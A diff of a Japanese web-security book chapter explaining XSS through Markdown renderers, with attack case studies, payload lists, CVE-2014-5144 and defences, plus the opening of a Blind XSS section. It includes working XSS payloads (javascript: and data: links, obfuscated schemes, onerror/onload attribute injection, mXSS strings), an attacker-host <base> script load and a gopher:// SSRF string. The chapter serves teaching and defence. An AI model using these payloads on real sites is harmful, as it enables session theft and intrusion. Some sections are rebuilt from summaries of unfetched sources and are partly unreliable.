-- strict CSP（nonce/hashベース + `strict-dynamic` + `object-src 'none'` + `base-uri 'none'`）は、そもそも攻撃者にスクリプトタグを注入させない「入口側」の防御であり、Trusted Typesという「sink側」の防御と組み合わせることで、DOM XSSに対する多層防御が完成する。
-- LighthouseなどのツールはCSPヘッダーの機械的チェックにより、これらの防御の導入状況を継続的に監視する手段を提供する。
-
+Trusted Typesは万能薬ではありません。既存の巨大なコードベースへの導入コストは高く、default policyに頼りすぎればサニタイズの粒度が粗くなり、そのサニタイザ自体のバグ（mXSSなど）はTrusted Types自体では検出できません。しかし、「DOM-based XSSの発生源をアプリ内の少数の監査可能な地点に強制的に集約する」という設計思想は、CSPのホワイトリストが構造的に抱えていた「回避経路の多さ」という問題（第4章「CSP Is Dead」参照）とは異なる角度からXSSを封じ込める、現時点でもっとも仕組みレベルで筋の良い防御策の一つです。
 
 ---
 
 ## Markdown経由のXSS
 
-### なぜMarkdownがXSSの入口になるのか
+### この節で扱う話
 
-Markdownは「軽量マークアップ言語」であり、その仕様（John Gruberによるオリジナル仕様、およびそれを標準化した CommonMark）は当初から **生のHTMLタグをそのまま埋め込んで良い** と定めている。つまり、Markdownを最終的にHTMLへ変換するパーサー（レンダラー）は、`# 見出し` のような独自記法だけでなく、`<script>` や `<img onerror=...>` のような生HTMLもそのまま出力に混ぜ込むのが「仕様通りの正しい動作」である。
+反射型・格納型の素朴なXSSは既に理解している読者でも、意外と見落としがちなのが「Markdownレンダラー」を経由したXSSである。GitHub Issue、チャットツール、Wiki、コメント欄、READMEプレビューなど、ユーザーが自由入力したMarkdownをHTMLに変換して表示する機能は至るところにある。問題は、Markdownという「安全に見える軽量マークアップ言語」が、実際にはHTMLへの変換過程で任意のリンク・画像タグを生成できてしまう点にある。つまり、**Markdownそのものに悪意はなくても、それをHTMLへ変換するパーサ（レンダラー）の実装次第で、`javascript:`スキームや`onerror`のようなイベントハンドラ属性を注入できる**。この節では、代表的な攻撃パターン（リンク型・画像型）の仕組みと、なぜそれぞれのフィルタが破られるのかを、実際に公開されているペイロード集と実例をもとに解説する。
 
-ここが罠になる。開発者は「Markdownは安全なテキスト記法だから、ユーザー入力をMarkdownとして扱えばHTMLインジェクションは起きない」と誤解しがちである。しかし実際には、Markdownパーサー自体はサニタイズ（危険なタグ・属性を除去する処理）を行わない設計のものが多く（例: JavaScriptの `marked` ライブラリはデフォルトで生HTMLをエスケープしない）、ユーザーが投稿したMarkdownがそのまま `innerHTML`（DOM要素の中身をHTML文字列として解釈・描画させるsink。入力が最終的に実行・解釈される危険な代入先）に流し込まれると、通常のHTMLインジェクション/XSSとまったく同じ条件が成立してしまう。
+### Markdown→HTML変換の基本構造とXSSが生まれる理由
 
-つまりMarkdown経由のXSSの本質は「新しい脆弱性クラス」ではなく、**Markdown→HTML変換という余計な変換ステップが挟まることで、開発者やサニタイザーの想定した入力検証がすり抜けられてしまう** という構造的な問題である。以降、この変換チェーンのどこに穴があるかを段階的に見ていく。
+MarkdownエンジンはMarkdown記法（`[text](url)`や`![alt](url)`など）を正規表現やパーサでHTMLに変換する。たとえばリンク記法は次のように変換される。
 
-### 1. 生HTMLの直接埋め込み
+```
+[Click Me](javascript:alert('XSS'))
+```
 
-最も単純なケースは、パーサーが生HTMLを無検査で通す設定になっている場合である。
+これは多くのMarkdownパーサによってそのまま次のHTMLへ変換される。
 
 ```html
-<script>alert(1)</script>
-<img src="x" onerror="alert(1)" />
+<a href="javascript:alert('XSS')">Click Me</a>
 ```
 
-**なぜ動くか**: CommonMark仕様は「生のHTMLブロック/インラインHTMLはそのまま出力にコピーする」と定めており、多くの実装（`marked`、`markdown-it` の初期設定など）はデフォルトでHTMLサニタイズを内蔵していない。したがって、Markdown→HTML変換後の文字列を検証せずに `innerHTML` に代入すれば、`<script>` やイベントハンドラ属性がそのままブラウザに解釈される。
+なぜこれが動くのか。`<a href>`属性の値として`javascript:`スキームのURLを設定すると、ユーザーがそのリンクをクリックした瞬間、ブラウザはナビゲーション先を「JavaScript式の評価」として解釈し、指定コードを実行する。これはMarkdown特有の脆弱性ではなく、HTMLの`javascript:`URIスキームという古典的なXSSベクタそのものである。しかし、多くのMarkdownレンダラーはHTMLエスケープ（`<`や`>`のサニタイズ）には気を配っていても、**リンクURLの中身がスキームとして危険かどうかまでは検証していない**ことが多い。これが「Markdown経由のXSS」が繰り返し発見される根本原因である。
 
-### 2. `javascript:` スキームを使ったリンク攻撃
+> ⚠️ 本書の方針として、実運用サービスに対する具体的な攻略手順（どのサービスのどの入力欄に何を送ればよいか、といった実戦攻略のステップ）は記載しない。以下はいずれも公開資料に記載された技術的な仕組みの解説であり、パーサの挙動理解を目的とする。
 
-生HTMLタグの使用がブロックされている（例: HTMLタグをエスケープする設定）場合でも、Markdownのリンク記法 `[表示テキスト](URL)` 自体は許可されていることが多い。URLの検証が不十分だと、`javascript:` 擬似プロトコルを差し込める。
+### 事例1: Jakob Pennington「Exploiting XSS via Markdown」
 
-```markdown
-[クリックしてください](javascript:prompt(document.cookie))
-[test](JaVaScRiPt:alert('XSS'))
+Taptuit社のセキュリティ研究者Jakob Pennington氏がMediumで公開した記事は、実在のWebアプリのMarkdownエディタ機能に対する調査を題材にしている。
+
+#### リンク型ペイロード
+
+まず基本形として、Markdownのリンク記法の括弧内（URL部分）に`javascript:`スキームを注入する手法が示されている。
+
+```
+[Click Me](javascript:alert('XSS'))
 ```
 
-**なぜ動くか**: Markdownパーサーはリンク記法を `<a href="URL">表示テキスト</a>` に変換するだけで、`href` の値がURLとして安全かどうかまでは検証しない。ブラウザは `<a>` がクリックされた際、`href` が `javascript:` スキームであればそれをJavaScriptとして実行する。素朴なブラックリスト（`javascript:` という文字列だけを弾く実装）は、大文字小文字の混在（`JaVaScRiPt:`）、URLエンコード、改行コード（`%0A`/`%0D`）の挿入、HTMLエンティティ化などで容易に回避される。
+これは前述の通り`<a href="javascript:alert('XSS')">Click Me</a>`に変換される。この方法の弱点は、**ユーザーがリンクをクリックしないと発火しない**という点である。攻撃者から見れば、被害者の能動的なクリックというワンステップの障壁が挟まることになり、攻撃の信頼性・即時性が下がる。
 
-```markdown
-[a](javascript://%0d%0aprompt(1))
-[a](Javas&#99;ript:alert(1))
-[a](javascript&#58;alert(1))
+#### 画像型ペイロード（ゼロクリックで発火する改良版）
+
+記事の核心は、この「クリックが必要」という制約を、画像記法(`![alt](src)`)を悪用することで取り除いた点にある。Markdownの画像記法は次のようにHTMLの`<img>`タグへ変換される。
+
+```
+![alt text](画像URL)
 ```
 
-これらはいずれも、正規表現などによる単純な文字列一致チェックが「見た目上は `javascript:` に見えない」文字列を通してしまうことを突いている。ブラウザ側のURLパーサーはエンティティ復号やパーセントデコードを行った上でスキームを判定するため、文字列比較だけの検査とブラウザの実際の解釈にズレが生じるのが根本原因である。
+普通は`<img src="画像URL" alt="alt text">`になるだけだが、レンダラーの実装によっては、画像URL部分に **ダブルクォートで属性値を終端させ、続けて任意のHTML属性を注入する** ことができてしまう。記事で示されたペイロードは次の形である。
 
-### 3. 画像記法を悪用した属性インジェクション
-
-Markdownの画像記法 `![alt](url)` も、実装によっては `url` 部分に任意の文字列を差し込めてしまい、生成されるHTMLの属性構造を壊すことができる。
-
-```markdown
-![test](<"onerror="alert('XSS')>)
-![test](<https://example.com/img.png"onload="alert('XSS')>)
+```
+![Uh oh...](https://www.example.com/image.png"onload="alert('XSS'))
 ```
 
-**なぜ動くか**: パーサーが `url` 文字列をエスケープせずにそのまま `<img src="URL">` のテンプレートに埋め込むと、URL文字列中の `"` がHTML属性の終端として解釈され、後続の文字列が新しい属性（`onerror=`、`onload=`）として扱われてしまう。これは典型的な「文字列組み立て型のHTML生成（テンプレートインジェクション的な構造）」に共通する原理であり、Markdown特有ではなく、あらゆる属性値の組み立てに共通する脆弱パターンがMarkdown経由で顔を出した例である。
-
-### 4. サニタイザーとMarkdownパーサーの実行順序の誤り
-
-より現代的で見落とされやすいのが、**「HTMLサニタイズ」と「Markdownパース」の順序を取り違える** バグである。
-
-```javascript
-// 危険な実装例
-document.body.innerHTML = marked.parse(
-  DOMPurify.sanitize(qs.get("content"))
-);
-```
-
-一見、DOMPurify（信頼できるHTMLサニタイズライブラリ）で入力を掃除してからMarkdownパーサーに渡しているので安全に見える。しかし **DOMPurifyはHTMLをサニタイズするものであり、Markdown記法そのものは危険とみなさず素通りさせる**。その後に実行される `marked.parse()` が、サニタイズ後の「安全なテキストに見えるMarkdown」から、新たに生HTML（実行可能な要素）を生成してしまう。
+これは以下のようなHTMLへ展開される（レンダラーが引用符のエスケープを行わない場合）。
 
 ```html
-<div id="1
-![](contenteditable/autofocus/onfocus=confirm('XSS')//index.html)">
+<img src="https://www.example.com/image.png" onload="alert('XSS')">
 ```
 
-**なぜ動くか**: サニタイズはHTMLの木構造（DOMツリー）に対して安全性を判定する処理であり、Markdown記法の文字列（`![...](...)`のような素のテキスト）はDOMPurifyの目には「ただのテキスト」にしか映らない。したがって、サニタイズをすり抜けた文字列がその後Markdownパーサーによって初めてHTML化されると、サニタイザーは一度もその危険なHTMLを検査していないことになる。**セキュリティ境界（どこで安全性を確定させるか）を誤った位置に置くと、後段の変換が新たな攻撃面を生成してしまう**、という一般原則の典型例である。正しい順序は「Markdown→HTML変換を先に行い、その最終出力のHTMLに対してサニタイズを実行する」ことである。
+なぜこれが致命的かというと、URL文字列の途中にある`"`が画像URLの属性値を早期に終端させ、続く`onload="..."`が**新たな属性として`<img>`タグに追加されてしまう**からである。仕組みとしては、Markdownパーサが「URLらしき文字列を`src`属性値としてそのまま埋め込む」際に、値の中にダブルクォート文字が含まれていてもエスケープ（`&quot;`への変換）をしていない、という単純な実装ミスに起因する。HTMLパーサ側からすればこれは正しく閉じられた属性の並びに見えるため、ブラウザは何の疑いもなく`onload`イベントハンドラを登録し、**画像の読み込みが完了した瞬間（＝ページ表示時に自動的に）JavaScriptを実行する**。
 
-### 5. ミューテーションXSS（mXSS）: パーサ再解釈という核心原理
-
-Markdown→HTML変換のパイプラインは、実際には次のような多段の解釈チェーンになっている。
+さらに画像が存在しない・読み込みに失敗するケースを使った亜種として、`onerror`属性を使う手法も紹介されている。
 
 ```
-Markdown (+拡張記法) → HTML文字列 → サニタイザーによるDOM構築・剪定 → シリアライズ（文字列化） → ブラウザによる再パース・レンダリング
+![Uh oh...]("onerror="alert('XSS'))
 ```
 
-mXSS（mutation XSS）とは、**サニタイザーが「安全」と判断して通したDOMツリーが、文字列にシリアライズされて再度ブラウザにパースされる際、ブラウザのエラー回復・名前空間処理によって元とは異なる（危険な）DOMツリーに“変異”してしまう** 現象である。
+画像URLをあえて意味のない文字列にしてダブルクォートで即座に閉じ、`onerror`ハンドラを注入する。ブラウザは指定されたsrcの読み込みに失敗すると`onerror`イベントを発火するため、**画像取得の成否にかかわらず確実にJavaScriptが実行される**という安定性の高い変種になっている。
 
-```html
-<svg></p><style><a id="</style><img src=x onerror=alert(1)>"></svg>
-<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+#### なぜこの攻撃が成立したか(前提条件)
+
+記事によれば、対象アプリケーションは元々Angular（当時のAngularSanitizeなどのテンプレートサニタイズ機構）による保護に依存していたが、Markdownレンダラー側の出力そのものに対する検証が不十分だったため、Angularのサニタイズを迂回してしまうケースがあった、という点が指摘されている。つまり、**「サニタイズはフロントエンドのテンプレートエンジンに任せてあるから安全」という思い込みが、Markdownレンダラーという別レイヤーの出力チェックの欠落を見逃す原因になった**、という多層防御の穴が本質である。バックエンドでMarkdownを保存する際にもサニタイズが行われておらず、結果として「MarkdownはHTMLではないから安全」という誤解に基づき、複数のレイヤー全てがノーチェックになっていた、というのがこの事例の教訓である。
+
+#### 影響とリスクの整理
+
+- リンク型: ユーザーの能動的クリックが必要（ソーシャルエンジニアリング要素あり）
+- 画像型(`onload`/`onerror`): **ユーザー操作不要**でページ表示と同時に発火する、いわゆる自己実行型(self-executing)のペイロードであり、ワーム化・自動拡散(ストアドXSSのself-XSS化)のリスクが高い
+
+> 出典: Exploiting XSS via Markdown — https://medium.com/taptuit/exploiting-xss-via-markdown-72a61e774bf8 （著者本人の再掲載: https://jakobthe.dev/posts/exploiting-xss-via-markdown/ より内容確認）
+
+### 事例2: HackTricksが整理する「Markdown内のXSS」の体系
+
+> ⚠️ **未取得の資料**: 「HackTricks: Markdown XSS」の該当ページ（https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/xss-in-markdown.html および そのミラー https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/xss-in-markdown）は、アクセス時にサーバー側で402/403エラーが返され本文を取得できませんでした。以下は同ページが一般に体系化していることで知られる分類を、代替で確認できた要約情報（同ページの構成に基づく検索結果の要約）とペイロード集(後述のcujanovic/Markdown-XSS-Payloadsリポジトリ、HackTricksが引用元とする公開リストと重複する内容)を突き合わせて整理したものであり、原文の逐語引用ではない点に留意されたい。
+
+HackTricksのMarkdown XSSページは、Markdown記法から生成されるHTML属性値に対して、どのような「危険なURLスキーム・エンコーディング」を注入できるかを一覧化していることで知られる。実際に公開されている代表的なペイロード集(cujanovic/Markdown-XSS-Payloads、GitHubスター500近くの著名リポジトリ)には、以下のようなバリエーションが列挙されている。それぞれはMarkdownのリンクまたは画像記法の「URL部分」に埋め込んで使う。
+
+```
+javascript:prompt(document.cookie)
 ```
 
-**なぜ動くか**: HTMLパーサーには「不正なマークアップを可能な限り解釈可能な形に修復する」というエラー回復規則がある。さらにSVG/MathMLのような別名前空間の要素の中では、`<style>` や `<title>` などの「raw textモード要素」（内部を生テキストとして扱う特殊要素）の扱いがHTML名前空間内と異なる。サニタイザーはHTML名前空間の規則で安全性を判定するが、実際にシリアライズ→再パースされる際にSVG/MathML内の特殊な解釈規則が働くと、サニタイザーが見ていたツリーとは別の、閉じタグの位置がずれた・属性が別要素に付け替わったツリーが最終的に構築される。この「サニタイザーが検査したツリー」と「ブラウザが最終的に描画するツリー」の不一致こそがmXSSの本質であり、単発の `onerror=` 検索のような表層的なフィルタでは絶対に防げない。
+もっとも素朴な形。`[text](javascript:prompt(document.cookie))`のようにリンクへ埋め込む。
 
-### 6. `<base>` タグ書き換えによる相対パス乗っ取り
-
-```html
-<base href="https://attacker.example/">
-<script src="/xss.js"></script>
+```
+j    a   v   a   s   c   r   i   p   t:prompt(document.cookie)
 ```
 
-**なぜ動くか**: `<base>` 要素はページ内のすべての相対URL（`src="/xss.js"` のような絶対パスや相対パス）の基準となるオリジンを上書きする。Markdown中に生HTMLとして `<base>` タグが混入できると、それ自体は `<script>` タグではないため「危険なタグのブラックリスト」から漏れやすい。しかし、その後に読み込まれる相対パスのスクリプトやスタイルシートが、すべて攻撃者が用意したオリジンから読み込まれるようにすり替わり、結果的に任意コード実行に繋がる。2025年に報告されたNuxt MDC（Nuxtの公式Markdownコンポーネントライブラリ）の脆弱性では、この `<base>` 要素がサニタイズ対象の検証から漏れていたことが指摘されている。
+スキーム名の文字間に空白を混入させる変種。単純な文字列マッチ（`javascript:`という完全一致でブロックするブラックリスト方式のフィルタ）を、ブラウザのURLパーサが空白を無視して`javascript:`として解釈することを利用して回避する。**「フィルタは文字列一致でブロックしようとしているが、ブラウザのパーサはより緩く解釈する」というギャップ**を突く典型例である。
 
-### 7. `gopher://` スキームによるSSRF連鎖
-
-サーバーサイドでMarkdown中の画像URLなどを実際にフェッチ（先読み・プレビュー生成など）する実装の場合、URLスキームの検証が甘いと、内部ネットワークへのリクエストを強制するSSRF（サーバーサイドリクエストフォージェリ）に転用できる。
-
-```markdown
-![pwn](gopher://127.0.0.1:1337/_GET%20/api/dev%20HTTP/1.1...)
+```
+&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29
 ```
 
-**なぜ動くか**: `gopher://` スキームは任意のバイト列を任意のTCPポートへ送出できるため、攻撃者はHTTPリクエストのバイト列を`gopher://`のペイロードとして偽装し、サーバーに「社内向けAPI」など本来到達できないはずのホスト・ポートへリクエストを送らせることができる。MarkdownのXSS対策（`javascript:` や `<script>` のフィルタ）だけに気を取られていると、このような別スキームを使ったサーバーサイド攻撃を見落としやすい。
+`javascript:alert('XSS')`をHTML数値文字参照(16進)にエンコードしたもの。HTMLパーサは属性値の解析時にこれらの実体参照をデコードしてから評価するため、`javascript:`という生の文字列を検出するブラックリストフィルタを回避できる。
 
-> 出典: XSS in Markdown — https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/xss-in-markdown.html
+```
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
+```
 
-### 実例: マークダウンエディタでのXSS悪用（Jakob Pennington, Taptuit）
+`data:`スキームでBase64エンコードしたHTMLドキュメント(`<script>alert('XSS')</script>`)そのものを埋め込む手法。`javascript:`という文字列を一切含まないため、`javascript:`のみを見るフィルタを完全に迂回できる。ただし多くのブラウザでは`data:`スキームによるトップレベルナビゲーションが近年制限されており(Chromeは2018年頃から`data:`URLへの直接ナビゲーションを既定でブロックする方向に強化)、成立するかはブラウザとコンテキスト(リンククリックによるナビゲーションか、`<iframe>`のsrcか等)に大きく依存する点に注意が必要である。
 
-Taptuit社のブログ記事では、あるWebアプリケーションのMarkdownエディタ機能を対象とした実際の脆弱性調査が紹介されている。要点は以下の通りである。
+```
+javascript://%0d%0aprompt(1)
+```
 
-- 対象アプリは、ユーザーが入力したMarkdownをMarkdownレンダリングライブラリ（`marked` 系）でHTMLに変換し、画面に表示する機能を持っていた。
-- Markdown仕様が「生HTMLの埋め込みを許容する」という前提自体がセキュリティ上の弱点であり、多くの人気Markdownライブラリはデフォルトで生HTMLをサニタイズ・エスケープしないため、対策を追加で実装しない限りXSSに対して無防備である。
-- 実際の攻撃では、複数の防御レイヤー（クライアント側の簡易フィルタ、サーバー側の一部エスケープなど）を段階的にバイパスするペイロードが用いられた。単一のブラックリストではなく、**エンコーディングの多重化**（HTMLエンティティ化とパーセントエンコードの組み合わせ、大文字小文字の攪拌など）によって各レイヤーの想定を外すアプローチが取られている。
-- 過去の類似事例として、GitLabのMarkdownパーサーに対する脆弱性（`%01` という制御文字を `javascript:` スキームの前に挿入することで、パーサーの正規表現マッチングをすり抜けつつブラウザには有効なリンクとして解釈させる手法）が挙げられている。これは、**サーバー側のフィルタが「解析」する文字列表現と、ブラウザが最終的に「解釈」する文字列表現が異なる場合に脆弱性が生まれる** という、本章全体を貫く原理をよく示す事例である。
-- 記事の結論として、「セキュリティ機能（サニタイズ処理）を無効化することは重大な警告サインであり、それを行う場合は最後の手段として、細心の注意を払って実施すべきである」という開発者向けの教訓が強調されている。
+`//`でコメントアウトの体裁を装いつつ、URLエンコードされたCRLF(`%0d%0a`)で改行し、次の行に実際のペイロードを書く。`javascript://`という文字列パターンだけを見て「コメント」と誤認するフィルタや、改行を考慮しない単純な正規表現フィルタを回避する意図がある。
 
-> ⚠️ **未取得の資料に関する補足**: 本記事（Medium: taptuit「Exploiting XSS via Markdown」）は、環境のegressプロキシによりMedium本体・著者のミラーブログ（jakobthe.dev）とも直接取得できませんでした（理由: ドメインブロック）。上記の内容はWeb検索で得られた記事の要約情報に基づいて再構成したものであり、原文の具体的なペイロード全文やスクリーンショットは含まれていません。詳細をご確認になりたい場合は、以下のURLからユーザーご自身で直接ご覧ください: https://medium.com/taptuit/exploiting-xss-via-markdown-72a61e774bf8
->
-> （以下は未取得資料の補足として一般知識に基づく解説です）実務上、この種のMarkdownエディタ脆弱性を検証する際は、まず「生HTMLがそのまま通るか」「`javascript:` リンクが通るか」という基本パターンを試し、通らなければ、Unicodeエンティティ化・パーセントエンコード・NULLバイトや制御文字（`%00`, `%01` など）の挿入、改行やタブの混入といった「デコーダの解釈違い」を突く技法を段階的に試すのが定石である。加えて、レンダリング結果を実際にブラウザのDevToolsで確認し、フィルタが弾いたつもりの文字列がDOM上でどう再構成されているかを目視で検証することが、ブラックリスト回避の発見に直結する。
+```
+vbscript:alert(document.domain)
+```
 
-> 出典: Exploiting XSS via Markdown — https://medium.com/taptuit/exploiting-xss-via-markdown-72a61e774bf8
+古い（レガシー）Internet Explorer限定でVBScriptを実行するスキーム。現行の主要ブラウザでは動作しないが、レガシーIE対応が必要な環境や過去のペネトレーションテスト史を理解する上で参照される。
 
-### まとめ: Markdown XSSを防ぐための実務指針
+```
+![x]("onerror="alert(1))
+onload="alert(1)
+```
 
-1. **変換順序を固定する**: 「Markdownパース → 生成されたHTMLをサニタイズ」の順序を必ず守る。サニタイズを先に行うと、その後のMarkdownパースが未検査の危険なHTMLを新たに生成しうる。
-2. **最終出力の一段階だけでなく、中間表現すべてを検査する**: レンダリング直後のHTML、サニタイズ後のHTML、実際にブラウザへ挿入された後のライブDOMという3段階を個別に確認する。特にmXSSは「サニタイズ後の文字列」と「ブラウザが再解釈した後のDOM」が食い違うことで発生するため、後者の検査が欠かせない。
-3. **リンク・画像URLのスキームを許可リスト方式で制限する**: `http:`、`https:`、`mailto:` など明示的に許可したスキームのみを通し、`javascript:`・`data:`・`gopher:` 等は原則拒否する。文字列の完全一致比較ではなく、ブラウザのURLパーサーと同じ正規化（デコード・小文字化）を経てから判定する。
-4. **`<base>` のような一見無害なタグにも注意する**: XSS対策は `<script>` やイベントハンドラ属性だけでなく、ページの基準URLやリソース読み込み経路を変更しうるタグ全般を対象にする。
-5. **サーバー側でのURLフェッチ機能にはSSRF対策を別途施す**: Markdown内のリンクや画像URLをサーバー側で先読みする機能がある場合、内部IPアドレス帯・非HTTPスキームへのアクセスを遮断する。
-6. **既製のサニタイズライブラリ（DOMPurifyなど）を利用しつつ、Markdownライブラリ側の生HTML許可設定（例: `marked` の `sanitize` オプションや `markdown-it` の `html: false` 設定）も併用し、多層防御を構成する**。ただしいずれか一方に頼らず、上記1〜2の原則に従って変換パイプライン全体を設計することが最も重要である。
+前節のPennington氏の記事と同一系統の、画像タグへの属性注入(属性境界インジェクション)。HackTricks系のリストでも同様に「画像記法の中に引用符を混ぜて属性を追加する」パターンが定番として扱われている。
+
+これらのペイロードに共通する設計思想は3系統に整理できる。
+
+1. **スキーム難読化系**（空白混入、大文字小文字混在`JaVaScRiPt:`、実体参照エンコード、URLエンコード）: 文字列一致ベースのブラックリストフィルタを、ブラウザ側のURL/HTMLパーサの寛容な解釈を使って回避する
+2. **属性境界インジェクション系**（画像・リンクURLに`"`を混入させ新規属性を注入）: パーサがURL文字列を無検査のまま属性値へ埋め込むことを悪用する
+3. **代替スキーム系**（`data:`、`vbscript:`）: 特定のスキーム名だけをブロックするフィルタの網羅漏れを突く
+
+> 出典: HackTricks: Markdown XSS（ページ本文は取得不可のため、上記は一般に公開されているペイロードの体系（cujanovic/Markdown-XSS-Payloads: https://github.com/cujanovic/Markdown-XSS-Payloads 等）から本書が独自に整理した内容） — https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/xss-in-markdown.html
+
+### 実際の被害事例: CVE-2014-5144（Telescope）
+
+上記のような手法が理論だけでなく実際のプロダクトで悪用された例として、オープンソースのブログ/フォーラムプラットフォームTelescopeにおけるMarkdown経由の格納型XSS（CVE-2014-5144、2014年公開）が知られている。Telescopeは投稿本文にMarkdownを許容していたが、レンダリング後のHTMLに対するサニタイズが不十分であったため、悪意あるMarkdown（リンク記法を利用した`javascript:`スキームの注入など）を投稿するだけで、その投稿を閲覧した全ユーザーのブラウザ上で任意のJavaScriptが実行される格納型XSSが成立した。この種の脆弱性は「Markdownは安全なテキスト記法である」という開発者側の思い込みと、レンダラーが生成したHTMLをその後どの層も再検証しない、という組み合わせで繰り返し発生してきた。
+
+### 防御策
+
+Markdown経由のXSSに対する防御は、根本的には「MarkdownをHTMLに変換した後の出力を、HTML由来のXSSと同じ厳格さで扱う」という一点に尽きる。具体的には以下が有効である。
+
+1. **HTMLサニタイズライブラリを変換後に必ず通す**: `DOMPurify`のような、許可リスト方式(allowlist)でタグ・属性を厳格に制限するサニタイザを、Markdownレンダラーの出力に対して必ず適用する。特に`href`/`src`属性値のURLスキームを`http:`/`https:`/`mailto:`など安全なものに限定するホワイトリスト検証が重要である。
+2. **`javascript:`等の危険スキームを属性値レベルで検証する**: 単純な文字列置換（ブラックリスト）ではなく、URLをパースしてスキーム名を正規化(小文字化・空白除去・実体参照デコード)した上で判定する。
+3. **属性値のエスケープを徹底する**: Markdownレンダラーが画像・リンクのURLをHTML属性として埋め込む際、ダブルクォート・シングルクォート・`<`/`>`を必ずエンティティエスケープする。これにより「属性境界インジェクション」系のペイロードは成立しなくなる。
+4. **CSP(Content Security Policy)による多層防御**: `script-src`を厳格化し、インラインイベントハンドラ(`onload`/`onerror`など)の実行自体をブロックする設定（`unsafe-inline`を許可しない）を敷いておけば、サニタイズ漏れが発生しても実害を防げる可能性が高まる。CSPについては本書第4章のCSP関連節を参照してほしい。
+5. **信頼できるMarkdownライブラリを採用し、既定のサニタイズ機能を無効化しない**: Pennington氏の記事が示す通り、「他のレイヤー(フロントエンドフレームワークのテンプレートサニタイズ等)が守ってくれるはずだから」という理由でMarkdownレンダラー自体のセキュリティ機能を無効化・弱体化させることは、多層防御の意図に反し危険である。
+
+Markdown経由のXSSは、一見「ただのテキスト記法」に見えるものが実際にはHTML生成の入口であるという事実を軽視したときに生まれる、典型的な「信頼境界の誤認」に基づく脆弱性クラスだと言える。
 
 ---
 
 ## Blind XSSと画像ファイルによるXSS
 
-反射型・格納型の基本的なXSSを理解した読者に向けて、本節では「攻撃者自身が実行結果を直接観測できない」Blind XSSと、「HTMLではなく画像ファイルという特殊なコンテナを経由してスクリプトを実行させる」画像XSSという、2つの発展的トピックを扱う。どちらも「攻撃者の脅威モデルが特殊である」「ブラウザ／サーバのパーサの解釈揺れを突く」という共通点を持ち、通常のXSS診断のチェックリストだけでは見落とされやすい領域である。
+これまで見てきたXSSの多くは、「自分がブラウザで踏んだページで、自分の目の前でJavaScriptが実行される」タイプだった。しかし実際のバグバウンティやペネトレーションテストの現場では、攻撃者自身の画面には何も起きず、遠く離れた場所にいる別の人間（サポート担当者や管理者）のブラウザで、何日も何週間も後になって初めてペイロードが発火する、というケースが数多く存在する。これが**Blind XSS（ブラインドXSS）**である。
 
-### 1. Blind XSS（ブラインドXSS）
+本セクションでは、Blind XSSの仕組みと実践的な手法を、Bugcrowdの解説記事を軸に整理する。あわせて、画像ファイルそのものにHTML/JavaScriptを埋め込んでXSSを成立させる、やや古典的だが原理的に重要な「画像XSS」を、徳丸浩氏のブログ記事をもとに解説する。両者は一見別の話題に見えるが、「攻撃対象が想定していないコンテキストでコードが解釈されてしまう」という共通の原理でつながっている。
 
-#### 1.1 定義と、通常の格納型XSSとの違い
+### 1. Blind XSSとは何か
 
-**Blind XSS（ブラインドXSS）** とは、攻撃者が注入したペイロードが、注入した本人ではなく、**別の権限を持つ第三者（多くは管理者やサポート担当者）が、別の管理画面やツール上でそのデータを閲覧したときに初めて実行される**格納型XSSの一種である。
+#### 1.1 通常のXSSとの違い
 
-通常の格納型XSSでは、攻撃者は「このフォームに入力した文字列が、このページのこの場所に出力される」という因果関係を自分のブラウザで確認しながらペイロードを調整できる。しかしBlind XSSでは、
+通常の反射型・格納型XSSでは、攻撃者は自分のブラウザで次のような流れをすぐに確認できる。
 
-- ペイロードを送り込む場所（例: お問い合わせフォーム、注文時の氏名欄、サポートチケットの本文、User-Agentヘッダ、ログに記録されるHTTPヘッダ類）
-- ペイロードが実際に**レンダリングされ実行される場所**（例: 社内の管理画面、CRM、ログ閲覧ツール、監視ダッシュボード、メールクライアントでのHTMLプレビュー）
+1. ペイロードを含むリクエストを送る
+2. レスポンスにペイロードがそのまま（あるいはエスケープされずに）出力される
+3. 自分のブラウザでJavaScriptが実行され、`alert(1)`のダイアログなどで即座に成功を確認できる
 
-が完全に分離しており、攻撃者はレンダリング側の画面を見ることができない。そのため「本当に脆弱性が存在するか」「いつ・誰の画面で実行されたか」を確認する手段として、**コールバック（外部への通信）を伴うペイロード**を用いる必要がある。これがBlind XSS特有の技術的核心である。
+これに対してBlind XSSは、ペイロードが**自分以外の誰か**が見る画面に格納型（Stored）で埋め込まれ、しかもそのページを攻撃者自身が直接閲覧する権限を持たない、というシチュエーションで使われる。典型的には次のような場所である。
 
-#### 1.2 攻撃が成立する仕組み（sinkの分離という構造）
+- カスタマーサポートへの問い合わせフォーム・チケットの本文
+- 返金申請・注文内容の修正など、社内の決済/バックオフィス業務で参照されるフィールド
+- コンテンツモデレーション（通報・レビュー）システムで人間が目視確認する投稿内容
+- ユーザーが入力したプロフィール情報や、管理者宛の通知メールに転記されるフィードバック欄
 
-Blind XSSの本質は、Webアプリケーションにおける **入力点（source）と、実行に至るsink（入力が最終的に実行・解釈される危険な代入先。例: `innerHTML`への代入）が、別のリクエスト・別の画面・別のユーザーセッションにまたがって存在する** という点にある。
+これらの共通点は、「入力された値を、入力者とは別の（多くの場合、より高い権限を持つ）人間が、別の管理画面やダッシュボードで閲覧する」という点である。攻撃者はそのフィールドにXSSペイロードを送信するだけで、自分の画面では何も反応がない。ペイロードが実際に発火するのは、サポート担当者や管理者がそのチケット一覧・ダッシュボードを開いた瞬間であり、攻撃者はその瞬間を直接観測できない。
 
-典型的なデータフローは次の通りである。
+> ⚠️ **本書の方針**: 本セクションはBlind XSSの「仕組み」と「なぜ危険か」を理解するための解説であり、実際の対象への侵入手順や具体的な攻略ステップ（どのサービスのどの管理画面を突くか、といった実践攻略）は記載しない。
 
-1. 攻撃者が、一般ユーザーとしてアクセス可能なフォーム（問い合わせ、レビュー、氏名変更、パスワードリセット申請時の備考欄など）にペイロードを送信する。
-2. アプリケーションはこの値をデータベースやログファイルに保存する。エスケープ処理はここでは行われないか、不十分である。
